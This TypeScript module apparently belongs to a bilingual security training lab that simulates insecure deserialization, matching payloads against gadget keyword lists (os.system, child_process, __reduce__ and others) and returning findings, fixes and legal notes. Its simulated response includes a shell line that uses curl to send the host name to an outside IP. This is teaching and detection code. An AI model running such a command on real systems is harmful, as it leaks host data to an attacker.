import type { LabFinding, SimulatedResult } from '../../types'
import type { Locale } from '../../i18n'
import { aggregateFindings, computeRisk, severityToRisk } from './riskScoring'

type Format = 'java' | 'python-pickle' | 'php' | 'nodejs' | 'json'

const JAVA_GADGETS = ['CommonsCollections', 'Spring', 'BeanShell', 'C3P0', 'ROME', 'Hibernate', 'JdbcRowSet', 'JBOSS']
const PYTHON_GADGETS = ['__reduce__', 'os.system', 'subprocess', 'eval', 'compile', 'builtins.exec']
const PHP_GADGETS = ['__destruct', '__wakeup', 'SimpleXMLElement', 'PHPGGC', 'Symfony', 'Monolog']
const NODE_GADGETS = ['_$$ND_FUNC$$_', 'function(', 'process.mainModule', 'require(', 'child_process']

export function simulateDeserialization(payload: string, scenario: Record<string, string | boolean>, locale: Locale = 'ru'): SimulatedResult & { riskScore: number } {
  const isRu = locale === 'ru'
  const format = (scenario.format as Format) ?? 'java'
  const allowList = Boolean(scenario.allowList)
  const findings: LabFinding[] = []

  const gadgets =
    format === 'java' ? JAVA_GADGETS :
    format === 'python-pickle' ? PYTHON_GADGETS :
    format === 'php' ? PHP_GADGETS :
    format === 'nodejs' ? NODE_GADGETS : []

  const matchedGadgets = gadgets.filter((g) => payload.toLowerCase().includes(g.toLowerCase()))
  const looksLikeJavaSerial = /^rO0AB|aced0005|H4sI/.test(payload)
  const looksLikePickle = /^gASV|^\\x80\\x04/.test(payload) || /__reduce__/.test(payload)
  const looksLikePhp = /^[OoaC]:\d+:"/.test(payload)

  if (matchedGadgets.length > 0 && !allowList) {
    findings.push({
      title: isRu ? `Гаджет-цепочка: ${matchedGadgets.join(', ')}` : `Gadget chain: ${matchedGadgets.join(', ')}`,
      severity: 'critical',
      cwe: 'CWE-502',
      evidence: matchedGadgets.join(', '),
      description: isRu
        ? 'Payload содержит известные классы/функции, ведущие к RCE при десериализации.'
        : 'Payload contains known classes/functions leading to RCE on deserialization.',
      recommendation: isRu
        ? 'Используйте allow-list типов; для Java — ObjectInputFilter; для Python — никогда не используйте pickle для недоверенных данных.'
        : 'Use type allow-list; for Java — ObjectInputFilter; for Python — never pickle untrusted data.',
      legalContext: isRu ? 'RCE = ст. 272/273 РФ / 278¹/278⁵ РУз.' : 'RCE statutes.'
    })
  }

  if (looksLikeJavaSerial && format === 'java') {
    findings.push({
      title: isRu ? 'Сигнатура Java serialized stream' : 'Java serialized stream header',
      severity: 'high',
      cwe: 'CWE-502',
      evidence: payload.slice(0, 16),
      description: isRu ? 'Поток начинается с rO0AB / aced0005 — Java native serialization.' : 'Stream starts with rO0AB / aced0005 — Java native serialization.',
      recommendation: isRu ? 'Откажитесь от Java native serialization в API.' : 'Drop Java native serialization in APIs.',
      legalContext: '—'
    })
  }

  if (looksLikePickle && format === 'python-pickle') {
    findings.push({
      title: isRu ? 'Python pickle header' : 'Python pickle header',
      severity: 'critical',
      cwe: 'CWE-502',
      description: isRu ? 'pickle с __reduce__ исполняет произвольный код при загрузке.' : 'pickle with __reduce__ runs arbitrary code on load.',
      recommendation: isRu ? 'Замените pickle на JSON или Protocol Buffers.' : 'Replace pickle with JSON or Protocol Buffers.',
      legalContext: '—'
    })
  }

  if (looksLikePhp && format === 'php') {
    findings.push({
      title: isRu ? 'PHP serialized object' : 'PHP serialized object',
      severity: 'high',
      cwe: 'CWE-502',
      description: isRu ? 'Формат O:n:"Class":… в unserialize() триггерит magic-методы.' : 'O:n:"Class":… in unserialize() triggers magic methods.',
      recommendation: isRu ? 'Используйте json_encode/json_decode.' : 'Use json_encode/json_decode.',
      legalContext: '—'
    })
  }

  if (allowList) {
    findings.push({
      title: isRu ? 'Allow-list типов активен' : 'Type allow-list active',
      severity: 'info',
      description: isRu ? 'Десериализатор примет только разрешённые классы.' : 'Deserializer accepts only allow-listed classes.',
      recommendation: '—',
      legalContext: '—'
    })
  }

  if (findings.length === 0) {
    findings.push({
      title: isRu ? 'Гаджеты не найдены' : 'No gadgets found',
      severity: 'info',
      description: '—',
      recommendation: '—',
      legalContext: '—'
    })
  }

  let body: object
  if (allowList) {
    body = { error: 'class not in allow-list', refused: matchedGadgets }
  } else if (matchedGadgets.length > 0) {
    body = {
      deserialized: true,
      gadgetChain: matchedGadgets,
      execution: {
        cmd: '/bin/sh -c "curl http://5.182.211.99/p?h=$(hostname)"',
        stdout: 'web-prod-3',
        returnCode: 0,
        runAs: format === 'java' ? 'tomcat' : format === 'php' ? 'www-data' : 'app'
      }
    }
  } else {
    body = { deserialized: true, type: 'plain-object' }
  }

  const overall = aggregateFindings(findings)
  const cvss = computeRisk({
    confidentiality: matchedGadgets.length > 0 && !allowList ? 'high' : 'low',
    integrity: matchedGadgets.length > 0 && !allowList ? 'high' : 'none',
    availability: matchedGadgets.length > 0 && !allowList ? 'high' : 'none',
    scope: 'changed'
  })

  return {
    technique: matchedGadgets.length > 0 && !allowList ? (isRu ? 'Insecure Deserialization → RCE' : 'Insecure Deserialization → RCE') : isRu ? 'Insecure Deserialization' : 'Insecure Deserialization',
    techniques: findings.map((f) => f.title),
    summary: isRu
      ? `format=${format}, gadgets=${matchedGadgets.length}, allowList=${allowList}`
      : `format=${format}, gadgets=${matchedGadgets.length}, allowList=${allowList}`,
    statusCode: allowList ? 400 : 200,
    headers: { 'Content-Type': 'application/octet-stream' },
    body: JSON.stringify(body, null, 2),
    severity: overall,
    legalBadge: isRu ? 'УК ст. 272/273 РФ / 278¹/278⁵ РУз' : 'Unauthorized access + malware',
    findings,
    riskScore: Math.max(severityToRisk(overall), Math.round(cvss.score * 10)),
    cvssVector: cvss.vector,
    riskBreakdown: cvss.breakdown
  }
}
